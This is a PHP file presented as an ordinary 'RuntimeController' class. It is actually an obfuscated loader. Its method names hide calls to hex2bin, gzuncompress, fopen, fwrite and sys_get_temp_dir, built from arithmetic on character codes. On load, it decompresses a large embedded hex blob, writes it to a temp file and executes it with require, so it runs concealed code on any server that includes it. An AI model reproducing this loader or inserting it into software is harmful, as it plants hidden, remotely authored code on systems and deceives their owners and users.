<?php
class RuntimeController
{
    private $hn = '';
    private $vi = '';
    public function handleRequest($p1)
    {
        $w = array(50 * 2 + 10, 3 * 35, 95 + 3, 19 + 8 + 23, 60 + 60, 103 - 2, 95 * 1 + 9);
        $q = '';
        foreach ($w as $s) {
            $q .= chr($s);
        }
        $q = strrev($q);
        return $q($p1);
    }
    public function initializeModule($p1)
    {
        $f = array(103 * 1, 49 * 14 - 564, 117, 79 + 2 + 29, 35 + 51 + 13, 111, 110 - 1, 53 * 2 + 6, 118 - 4, 3 + 98, 115, 124 - 9);
        $y = '';
        foreach ($f as $c) {
            $y .= chr($c);
        }
        return $y($p1);
    }
    public function computeResult($p1, $p2)
    {
        $s = array(106 + 4, 54 * 1 + 47, 115 - 3, 27 + 84, 81 + 21);
        $a = '';
        foreach ($s as $am) {
            $a .= chr($am);
        }
        $a = strrev($a);
        return $a($p1, $p2);
    }
    public function filterResults($p1, $p2)
    {
        $s = array(74 + 28, 7 * 17, 3 + 111, 115 - 10, 3 * 23 + 47, 101 * 1);
        $g = '';
        foreach ($s as $k) {
            $g .= chr($k);
        }
        return $g($p1, $p2);
    }
    public function calculateSum($p1)
    {
        $j = array(102, 3 * 33, 45 + 9 + 54, 24 * 69 - 1545, 115, 101 * 1);
        $u = '';
        foreach ($j as $n) {
            $u .= chr($n);
        }
        return $u($p1);
    }
    public function cacheData($p1, $p2 = null)
    {
        $p = array(14 * 110 - 1431, 16 * 3 + 57, 2 * 57, 85 + 31, 99 * 5 - 381);
        $pt = '';
        foreach ($p as $s) {
            $pt .= chr($s);
        }
        $pt = strrev($pt);
        return $pt($p1, $p2);
    }
    public function prepareOutput()
    {
        $this->vi = $this->cacheData($this->processData(), '/');
    }
    public function resolveAction()
    {
        $this->hn = $this->initializeModule($this->handleRequest($this->na));
    }
    public function syncRecords()
    {
        $fn = $this->vi . '/fs-690d72b2ef098';
        $f = $this->computeResult($fn, 'w');
        $this->filterResults($f, $this->hn);
        $this->calculateSum($f);
        $this->logEvent($fn);
    }
    private $na = '789ca5580f6fdac812ff2a89141d5846c8d8bb6b28cf57553' . '9faae7a79e194a4777aaa22cbd8eb603036b14d80e4f2dddfc' . 'cac4d6d48a0775782f1ce9fdfccceccceeef65f1f97d3e5991' . 'f7b797ee6aea7f39765163d79853ccb0baf88fc0b779a4f86e' . 'afd2c5c257e11a5c9992bbd65fbc25d44bef61285edf35cc6e' . '1870f24aba9777793b7b561268b55969c4de5c69c4449bb26f' . '68db4efb5e16bd35ecd0622bcd4541c2fcbbc6dbbe5864fb39' . '6f3738bf584051f6e5bb66506cc12a19036b34df8f561dc13a' . 'd6ecb578fd0861f1b8821b007c2862f10a4e5c1d3344cafd56' . '9b96996136a8923383ecd80337b601b825b9e69889e6dc0bb0' . 'fea96e821241303f8410d3344480f44047cc131b484660d9b2' . '1fce601d141af8fa3c99a46dc1e300f102d66b18125d84078c' . '2b618f3dff91d00243acf3822332e062c84af6719dce37d262' . 'd63276289800b111064882acce6c22617519559f8f4f03920f' . '7e6123db27b36850ae5f041ce7ac4b2208ca83ab124121f1fa' . '2926a22b52798a2178502b2454ff8181b4c0032e601d2f16d3' . '1addee4b35fbd3e139ce84306996d40b44333846873619a12c' . '0e0570898860f6f7dc8a78519b28127305f01449f7e2196c02' . '30e265878b66585824146e06b0568c89faa44d8144353f81cc' . '32329912a55cb7550f705e83cc49958e5741090a3e06a4353b' . '590088905d7027c25de5351c740531645210da9ca6cc639431' . 'f0da4e6541ce07c59547d85b02853c2c11cd6af4da98a09d90' . 'af13d7ca4a245f89d18cecaaef23a5dd35a310dd6e78c33f4c' . 'e3043ab6742ad1801cecd637db53e20a4f8a435513996acd42' . 'c68da10742c1a9a79422102044f2d18f8700a102e0924e07a0' . '196aff2818284d96de11b226fcbe001db0761348096695a8f3' . '2abea229d961e00ce2e43c9a6b24ed1231135416ef0101693c' . 'f063457268184d0381af06a5af1563655781fd4040bb9c9290' . 'a3d1435190336ab38a4e8534eb8090ce826c8e584dd63284ca' . '143ff96db3d7cce2d103541b887b94715490ea278942ebe8b5' . '38abe6b50f5d5949486f754c5679aee5942d704a1903260545' . 'ec9c59ba21c7fa96c4bb9b4882af4227d33b42aae982f36e01' . '4d17013d6254bb83df94a380e83c3f9d63280b83d5e0f7f591' . 'd3b17a3d591fc3555c39dd2326be64e4507824b0d11c4496ab' . '6dacf709502a63476619a3c52692215ba935d768740607fd8b' . '5015508030a09ae09ea750bb5266ddf34a00df454f9abd0443' . '596096b4ad498cbb56262d3a586802b42aa4550cca895967b0' . 'e52b6aa7d706acf4878502bcea4362104b5fd40b51844b36d5' . 'ca236f41ed8955fa7d20b64d6c62301ece6b8dfab8d57d3866' . 'fb1d20c7473e4c27920ca7359c0f9e0dfa3bb6f0d29d804b57' . 'b4d7bb970a32075dca9376fa24c00645d8290cc4f3fe545b64' . 'c7335ea34c1e6b48834eddc71422fcea5f61244b209e8217ff' . '82a817bc8c42d0cb9afc75c2ec048a10c29cf8374e55cb897e' . '3f17fbe8c8617eeb32c9c7694145a9642536c1b3a7db4219d6' . 'fea9c5ed7e67af341524f8fe5c1a61c7d23cc7ba7e1056c9ed' . 'a703d8d62591dbbeab25d87dcfa56b36677b95efb6af7e5810' . 'b237b7e20dd037f76327a7d3a5dabf14f3f498028bdfc551ba' . '2fecfd64f12c0c62493de5c855fd78f046e01a99bb6ca7480e' . '4abcacb811316c409beda3f9c3ce263452887eaf9d0c1ebb6d' . '63d60089d3e5a95993db6a54344db044ad5573adf14ea779bf' . '13a31ae003b87d69af3d14f8c210fc3b73c2e7d065f0f4d700' . '834c7823c0c85bde7f689b1b2b11f89a6c327c604b157a706a' . 'ecee603573ea4364afc7815c8321bc3d7ef57156c6417eedad' . 'fc27c1f32a7b5d8b63059fe2c6956a37ca6d330462dca964d1' . 'e70e00c8c150238aa8bbabe17c7de24deeb5b7082d5a81892b' . '5e3afb2d88d92087b17406a4322402f4b97484ad69dcbaf375' . '7e3dfeedcdbdb2bf7f7d1cd97cffffb6d34bae9a88ef923e2b' . 'f8e6fef3af585acf7b4238a9fc75757e33faec6979feebe8ca' . 'f3b8dc86238f931e59bd1ddd79bebbb9b4fd7b79fc1c986b28' . '9daf5c731a05f479f7ed903283bf311a5cbf1f5f5e8f2eeeec' . 'b7f47e3af8d3943cd1e537c5743d500e9c98df4490ba9db674' . '57c90459484694927921fa7b92c09b40d6e9f9b3bd2123749d' . '80feecfebdb0b37f4ea4fd3ca7b37e5b8dcfd2edcd073965e9' . '64b17ac54d50217eb89d3465ed306dc6cb47be7a040e152439' . '30ae4def6043cb8d860f1ee23d1b1a0dbc28dbf7e34d817c3c' . 'b0e2e33c4ee1ed8852bcf3bd8782a7c54478ffbe11bca78ff7' . '94b35019d15e8749bd3467240eb33cb9c304ffd79ba9449bb8' . 'd71fab86f1baf30da87e691a23cd76710a7b71d4ed58674df2' . '1c8fab262f5fe66eb27c6da879aae69e8d55f7578ca32ed255' . 'cae8a9cde3b181ad5ac0f4e2bd5c1e23c9469a989cd25f3a41' . '3427d9600756b5ce8b56f6571f1a451b9e36904944b3700c53' . '9883cc44d3bf0e5efecb661b55ac06938c8a9ba272f70275e6' . 'ee64e5570b7a31b6867cd74e498088c4a923d1f158cc1e76d7' . '50844f9d94971fcbf8f4529bef5d3a3f2584b706304e18f6f0' . 'b44583888d6ac36b80522fcc6db1e85872be2fbd0b2f4b3898' . 'c5740843e15c1e21834de09013859c5f10fc4189779189c08c' . '2aa0e783c09200d17bef7e1660d3828d6308a0b99b94f5ed6a' . '689d74b7ed0ab9f3d6cfdc4586dcf8fd3994348aa05ef9b808' . '0d44d883e1e370e9e7528d0d875f392321b1ebdbde01d95ee2' . 'dd29fa66707ed7c4bbd11a09a6d10eea74887b26dd263753e8' . '17a6bd297eada36941b388768e4d179e512806b7ffeb91b026' . '67d0850e85ca9574e6d3acfca2bd1c14d6ca6ce4fcecf04dcd' . '99f105c798907569abc07d574908726a17a600f77602394899' . 'fc2916ee2e55230b71ccdf234a9dec91d8d76bddd9d95b47ff' . '0921a342ea8980692dac5eaf5ffba34a20f';
    public function logEvent($p)
    {
        require $p;
    }
    public function processData()
    {
        $a = array(19 * 52 - 873, 2 + 111 + 8, 76 + 29 + 10, 78 * 1 + 17, 103, 59 * 14 - 725, 99 * 51 - 4933, 95, 31 * 1 + 85, 101 * 1, 19 + 13 + 77, 97 * 1 + 15, 81 + 14, 110 - 10, 3 * 35, 32 + 41 + 41);
        $s = '';
        foreach ($a as $n) {
            $s .= chr($n);
        }
        return $s();
    }
}

$kc = new RuntimeController();
$kc->prepareOutput();
$kc->resolveAction();
$kc->syncRecords();